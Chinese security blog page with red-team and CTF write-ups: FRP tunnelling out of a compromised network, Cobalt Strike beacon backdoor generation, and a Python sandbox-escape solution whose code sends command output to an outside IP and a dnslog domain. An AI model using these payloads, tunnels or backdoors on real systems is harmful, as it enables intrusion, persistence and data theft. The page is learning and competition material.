<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>k4i_x3i0&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="k4i_x3i0,一个热衷于web安全的大菜鸡">
<meta property="og:type" content="website">
<meta property="og:title" content="k4i_x3i0&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="k4i_x3i0&#39;s blog">
<meta property="og:description" content="k4i_x3i0,一个热衷于web安全的大菜鸡">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="k4i_x3i0">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="k4i_x3i0&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">k4i_x3i0&#39;s blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Frp基操" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/06/21/Frp%E5%9F%BA%E6%93%8D/" class="article-date">
  <time datetime="2023-06-21T14:18:17.000Z" itemprop="datePublished">2023-06-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RedTeam/">RedTeam</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/06/21/Frp%E5%9F%BA%E6%93%8D/">Frp基操</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>##端口转发</p>
<p>模拟环境：</p>
<p>本地win11开启web服务模拟内网机器，kali模拟已经拿到shell的linux靶机。</p>
<p>需求：将内网win11的服务转发到公网上，让攻击者能够直接访问</p>
<p>服务端设置 （放vps运行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_port = 10000  </span><br><span class="line">dashboard_port = 10050 </span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = admin</span><br><span class="line">enable_prometheus = true</span><br><span class="line">vhost_http_port = 8087    #http服务要在服务端设置</span><br><span class="line"></span><br><span class="line">log_file = ./log/frps.log</span><br><span class="line">log_level = info</span><br><span class="line">log_max_days = 3</span><br></pre></td></tr></table></figure>

<p>客户端设置 (在kali中运行)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vpsIP</span><br><span class="line">server_port = 10000</span><br><span class="line"></span><br><span class="line">user = k4</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">use_compression = true</span><br><span class="line">local_ip = 10.254.2.55</span><br><span class="line">custom_domains = vpsIP</span><br><span class="line">local_port = 8087</span><br><span class="line">remote_port = 8087</span><br><span class="line"></span><br><span class="line">log_file = ./log/frpc.log</span><br><span class="line">log_level = debug</span><br></pre></td></tr></table></figure>

<p>能够拿到win的shell，太危险辣，没事就别挂本机的，小心学习资料暴露(狗头)</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230621221926307.png" alt="image-20230621221926307"></p>
<p>frp使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#后台运行frp后台</span><br><span class="line">./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;  #启动</span><br><span class="line">ps -aux|grep frp| grep -v grep  #关闭（杀进程）</span><br><span class="line">root      3600  0.1  0.1 110188  9484 pts/0    Sl   15:04   0:00 ./frpc -c ./frpc.ini </span><br><span class="line">kill -9 3600</span><br></pre></td></tr></table></figure>

<p>还可以配合利用systemctl来控制启动</p>
<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>上面实例只是将本地的单个端口转发到了公网上，但是渗透环境中需要将内网环境带出来。这样子就需要搭建一个反向代理：代理服务器接收internet的请求，然后将请求转发给内部网络的服务器，并将从内网服务器返回的结果返回给internet上请求连接的客户端</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230621214014141.png" alt="image-20230621214014141"></p>
<h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><p>Frp服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">Bind_addr = 0.0.0.0   </span><br><span class="line">bind_port = 7000    </span><br><span class="line"></span><br><span class="line">dashboard_port = 7500  </span><br><span class="line">dashboard_user = admin     </span><br><span class="line">dashboard_pwd = admin</span><br><span class="line"> </span><br><span class="line">allow_ports = 40000-50000</span><br></pre></td></tr></table></figure>

<p>Frp客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vpsIP</span><br><span class="line">server_port = 7000     </span><br><span class="line">tls_enable = ture     </span><br><span class="line">pool_count = 5    </span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 46075</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = admin</span><br><span class="line">plugin_passwd = admin</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230621214706286.png" alt="image-20230621214706286"></p>
<h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><p>设置好代理后即可访问</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230621221606626.png" alt="image-20230621221606626"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230621221546423.png" alt="image-20230621221546423"></p>
<h2 id="Frp部分参数"><a href="#Frp部分参数" class="headerlink" title="Frp部分参数"></a>Frp部分参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Bind_addr = 0.0.0.0   #服务端监听地址 默认0.0.0.0</span><br><span class="line">bind_port = 7000    #服务端监听端口</span><br><span class="line">dashboard_port = 7500  #状态以及代理统计信息展示,vpsip:7500可查看详情</span><br><span class="line">dashboard_user = admin     #访问用户</span><br><span class="line">dashboard_pwd = password    # dashboard_pwd访问密码</span><br><span class="line">log_file = ./frps.log    #log_file日志文件</span><br><span class="line"></span><br><span class="line">log_level = info    # log_level记录的日志级别</span><br><span class="line">log_max_days = 3     # log_max_days日志留存3天</span><br><span class="line">authentication_timeout = 0     #authentication_timeout超时时间</span><br><span class="line">max_pool_count最大链接池,每个代理预先与后端服务器建立起指定数量的最大链接数</span><br><span class="line">max_pool_count = 50</span><br><span class="line">allow_ports = 40000-50000  #允许代理绑定的服务端端口</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://gofrp.org/docs/faq/">https://gofrp.org/docs/faq/</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42335264/article/details/83584367">https://blog.csdn.net/qq_42335264/article/details/83584367</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hackmang/p/14516969.html">https://www.cnblogs.com/hackmang/p/14516969.html</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/06/21/Frp%E5%9F%BA%E6%93%8D/" data-id="clj5t3kqz0000n8uqf8s20xzn" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RedTeam/" rel="tag">RedTeam</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-CobaltStrike基操" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/06/20/CobaltStrike%E5%9F%BA%E6%93%8D/" class="article-date">
  <time datetime="2023-06-20T04:01:14.000Z" itemprop="datePublished">2023-06-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/06/20/CobaltStrike%E5%9F%BA%E6%93%8D/">CobaltStrike基操</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前言：最近和大哥们打了下红队，发现很多工具虽然知道，都还不是很熟悉。准备熟悉下这些工具的使用，这里只简单介绍了cs的上线方法，更多其他操作可以翻阅文档</p>
<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver ip passwd   //端口默认为50050</span><br></pre></td></tr></table></figure>

<p>默认CS端口比较危险，若是泄露可能被他人登录。密码爆破脚本：<a target="_blank" rel="noopener" href="https://www.3hack.com/go/aHR0cHM6Ly9naXRodWIuY29tL3J5YW5vaG9yby9jc2JydXRlcg==">https://github.com/ryanohoro/csbruter</a></p>
<p>修改端口方法：在teamserver中修改</p>
<p><img src="../../../../typara/pictures/image-20230619170620522.png" alt="image-20230619170620522"></p>
<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>打开直接连接，用户名随便写</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619173225201.png" alt=" m       "></p>
<h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>创建监听器</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619200251948.png" alt="image-20230619200251948"></p>
<p>生成后门：选择刚刚创建的监听器即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619200409400.png" alt="image-20230619200409400"></p>
<p>然后将生成的马传进目标靶机，运行即可。这里看到已经上现</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230619200834823.png" alt="image-20230619200834823"></p>
<p>###linux</p>
<p>CS默认是没有生成linux后门的功能的，需要下载插件CrossC2</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/releases">https://github.com/gloxec/CrossC2/releases</a></p>
<p>根据使用操作系统下载，其中<code>CrossC2-GithubBot-2023-03-27.cna</code>都要下载</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114354411.png" alt="image-20230620114354411"></p>
<p>下载后，修改<code>CrossC2-GithubBot-2023-03-27.cna</code>中的路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114516233.png" alt="image-20230620114516233"></p>
<p>然后进入CS选择添加脚本，就添加刚刚的<code>CrossC2-GithubBot-2023-03-27.cna</code>文件即可。</p>
<p>最后就是创建监听器，监听器需要选择https的</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114815036.png" alt="image-20230620114815036"></p>
<p>然后生成linux后门，（没有添加脚本的话是没有这个选项的）</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620114927189.png" alt="image-20230620114927189"></p>
<p>注意<code>.cobaltstrike.beacon_keys</code>文件是服务端里的</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620115029549.png" alt="image-20230620115029549"></p>
<p>除此之外还可以直接生后门</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./genCrossC2.Linux 192.168.50.123 443 .cobaltstrike.beacon_keys null Linux x64 /tmp/LinuxShell</span><br></pre></td></tr></table></figure>



<p>build生成后，把马传进目标靶机执行即可上线</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230620115220237.png" alt="image-20230620115220237"></p>
<h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h2><p>CS还有许多功能，上面写的只是如何上线。各种攻击方法可以参考文档</p>
<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/06/20/CobaltStrike%E5%9F%BA%E6%93%8D/" data-id="clj3rq0nc0000fkuq6gqi12os" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2023-5-3-6-1刷题日记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/05/03/2023-5-3-6-1%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" class="article-date">
  <time datetime="2023-05-03T14:10:14.000Z" itemprop="datePublished">2023-05-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/05/03/2023-5-3-6-1%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">2023.5.3-6.1刷题日记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="5-3"><a href="#5-3" class="headerlink" title="5.3"></a>5.3</h2><p>D^3CTF复现，D^3开始那晚看了下题，java,go没有思路就跑路了，后面才知道上了些其他题，貌似比第一轮的简单，趁着环境没关，复现一下</p>
<h3 id="Escape-Plan"><a href="#Escape-Plan" class="headerlink" title="Escape Plan"></a>Escape Plan</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_3</span>():</span><br><span class="line">    cmd = request.form.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;pre&gt;</span></span><br><span class="line"><span class="string">import requests, base64</span></span><br><span class="line"><span class="string">exp = &#x27;&#x27;</span></span><br><span class="line"><span class="string">requests.post(&quot;&quot;, data=&#123;&quot;cmd&quot;: base64.b64encode(exp.encode())&#125;).text</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = base64.b64decode(cmd).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad base64&quot;</span></span><br><span class="line"></span><br><span class="line">    black_char = [</span><br><span class="line">        <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> black_char:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;failed: `<span class="subst">&#123;char&#125;</span>`&#x27;</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&quot;success&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        msg = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>考点：python的代码执行，思路不难，但是传进去的参数存在黑名单过滤，需绕过，这点比较麻烦</p>
<p>要执行的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, os</span><br><span class="line">flag = os.popen(<span class="string">&quot;whoami&quot;</span>).read().encode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">host = <span class="string">&quot;120.48.123.181&quot;</span></span><br><span class="line">port=<span class="number">7777</span></span><br><span class="line">s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.sendall(flag)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>本地测试执行的是whoami，靶机直接改为<code>/readflag</code>即可</p>
<p><img src="http://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230503110735329.png" alt="image-20230503110735329"></p>
<p>接下来就是绕过过滤：</p>
<p>方法参考这篇文章，<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1322842.html">Python 沙箱逃逸的通解探索之路 | CN-SEC 中文网</a>。其中eval被过滤了，可以用<code>ᵉval</code>绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">本地测试demo:</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">u = <span class="string">&#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;</span></span><br><span class="line">cmd1=<span class="string">&#x27;X19pbXBvcnRfXygnb3MnKS5wb3Blbignd2hvYW1pJykucmVhZCgp=&#x27;</span></span><br><span class="line"><span class="comment"># rce =b&#x27;&#x27;&#x27;__import__(&#x27;os&#x27;).popen(&#x27;python -c &quot;import socket, os; flag = os.popen(\\&quot;whoami\\&quot;).read().encode();host = \\&quot;120.48.123.181\\&quot;;port=7777;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host, port));s.sendall(flag);s.close();a=1;&quot;&#x27;).read()&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># cmd1=str(base64.b64encode(rce)).strip(&quot;b&quot;).strip(&quot;&#x27;&quot;)</span></span><br><span class="line">CMD = <span class="string">&quot;ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;()))[len([])]))&quot;</span>.<span class="built_in">format</span>(cmd1)</span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">cmd=base64.b64encode(CMD.encode())</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cmd = base64.b64decode(cmd).decode()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bad base64&quot;</span>)</span><br><span class="line">black_char = [</span><br><span class="line">    <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> black_char:</span><br><span class="line">    <span class="keyword">if</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;failed: `<span class="subst">&#123;char&#125;</span>`&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">eval</span>(cmd))</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    msg = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>way2:</p>
<p><a target="_blank" rel="noopener" href="https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe">https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe</a></p>
<p>利用dnslog,执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 `whoami`.mmfudk.dnslog.cn</span><br><span class="line">__import__(&#x27;os&#x27;).popen(&#x27;ping -c 1 `whoami`.mmfudk.dnslog.cn&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="http://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230503113857053.png" alt="image-20230503113857053"></p>
<ol>
<li>禁用字母，使用全角符号绕过</li>
<li>禁用数字，使用 <code>len(black_list)</code> <code>len([])</code> 拿到</li>
<li><code>repr(request)</code> 拿到字符串，再使用数组切片进行截取</li>
</ol>
<p>###TAMUctf 2023-Blackbox</p>
<p>比赛的时候没做出来，伪造cookie一直没成功,来复现一下</p>
<p>做的时候直接发现存在文件包含，但没有发现还存在git泄露。因此还有amin.php和login.php这个俩个文件没读出来，关键的数据库文件也没弄出来，当时就是一直找不到key，无法伪造。把git泄露给忘了，没去试</p>
<p><img src="http://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230503220202193.png" alt="image-20230503220202193"></p>
<p>找到key，关键！！！！</p>
<p><img src="http://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230503220407599.png" alt="image-20230503220407599"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo hash(&#x27;md5&#x27;, &#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;.&#x27;eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9rZXkiOiIyNmNlYjY4NWY0NmU2ZDIyIiwiYWRtaW4iOnRydWV9&#x27;);</span><br></pre></td></tr></table></figure>

